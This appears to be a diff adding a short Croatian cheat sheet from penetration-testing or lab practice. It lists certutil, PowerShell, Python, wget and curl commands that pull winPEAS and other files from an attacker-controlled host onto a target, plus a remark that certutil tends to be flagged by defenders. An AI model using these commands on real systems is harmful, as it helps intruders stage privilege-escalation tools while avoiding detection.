@@ -1,0 +1,20 @@
+Windows uređaji
+certutil -urlcache -f http://10.10.10.10/winPEAS.exe winPEAS.exe
+//certuntil je generalno flagan pa nije pametno korisiti ako ne znamo radi li
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10:8000/file.exe' -OutFile 'C:\Users\Public\file.exe'"
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10:8000/file.exe' -OutFile 'file.exe'"
+//ovo generalno radi
+
+ako ima python instaliran
+python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10:8000/file.exe','C:\\Users\\Public\\file.exe')"
+
+
+linux
+wget http://10.10.10.10:8000/winPEAS.sh
+koristimo flag -P ako zelimo dodati path
+
+curl http://10.10.10.10:8000/winPEAS.sh -o skripta.sh
+curl -O http://10.10.10.10:8000/winPEAS.sh
+
+-O sprema kao ime datoteke, a -o dodajes custom ime
